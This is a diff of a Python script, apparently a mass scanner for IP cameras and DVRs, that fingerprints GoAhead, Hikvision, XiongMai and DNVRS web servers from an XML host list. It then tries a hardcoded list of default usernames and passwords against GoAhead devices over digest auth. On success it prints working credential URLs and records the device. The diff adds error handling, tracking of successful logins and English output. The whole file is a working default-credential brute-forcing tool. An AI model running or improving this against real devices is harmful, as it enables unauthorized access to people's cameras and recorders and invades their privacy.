@@ -3,6 +3,7 @@ from xml.dom import minidom
 import os
 import httpx
 
+
 port = "81"
 file = "test.xml"
 
@@ -13,6 +14,8 @@ srv_hikvision = []
 srv_xiongmai = []
 srv_goahead = []
 srv_error = []
+goahead_not_ok = []
+goahead_ok = []
 
 def leer_listado(file):
 	file = minidom.parse(file)
@@ -55,15 +58,17 @@ def server_reader(ip,port):
 		
 	except httpx.RemoteProtocolError:
 		srv_error.append(ip)
+
+	except httpx.DecodingError:
+		srv_error.append(ip)
+
 		
 		
 def imprimir():
-	print("== Resultados")
-
+	print("== Results")
 	print("= GoAhead-Webs: " + str(len(srv_goahead)))
-	for res in srv_goahead: 
-		print("== http://" + res + ":" + port)
-
+	#for res in srv_goahead: 
+	#	print("== http://" + res + ":" + port)
 	print("= DNVRS-Webs: " + str(len(srv_dnvrs)))
 	print("= Hikvision DVR: " + str(len(srv_hikvision)))
 	print("= XiongMai uc-httpd: " + str(len(srv_xiongmai)))
@@ -73,14 +78,18 @@ def imprimir():
 def brute_pass(dir_ip,port):
 	user_web = ['admin','']
 	user_pass = ['admin','','12345','123456','1234567','12345678','123456789','1234567890','11111']
-	for user in user_web:
-		for password in user_pass:
-			auth = httpx.DigestAuth(user, password)
-			cam_get = httpx.get("http://" + dir_ip + ":" + port , auth=auth)
-			if cam_get.status_code == 200:
-				print("=* http://" + user + ":" + password + "@" + dir_ip + ":" + port + "/")
-				#print("Credentials: " + user + ":" + password)
-				break
+	try:
+		for user in user_web:
+			for password in user_pass:
+				auth = httpx.DigestAuth(user, password)
+				cam_get = httpx.get("http://" + dir_ip + ":" + port , auth=auth)
+				if cam_get.status_code == 200:
+					print("=* http://" + user + ":" + password + "@" + dir_ip + ":" + port + "/")
+					goahead_ok.append(dir_ip)
+					break
+
+	except httpx.ConnectTimeout:
+		print(dir_ip + " Error")
 
 def main():
 	print("======================")
@@ -88,7 +97,7 @@ def main():
 	print("= by rz7")
 	print("======================")
 	leer_listado(file)
-	print("= Escaneando " + str(len(lista_ip)) + " Hosts")
+	print("= Scanning " + str(len(lista_ip)) + " Hosts")
 	print("======================")
 	for ip in lista_ip:
 		#print(ip)
@@ -98,5 +107,10 @@ def main():
 	print("= GoAhead Credentials ")
 	for ip in srv_goahead:
 		brute_pass(ip,port)
+	print("----------------------")
+	print("= GoAhead Not Default Credentials ")
+	goahead_not_ok = list(set(srv_goahead) - set(goahead_ok))
+	for ip in goahead_not_ok:
+		print("== http://" + ip + ":" + port)
 
 main()
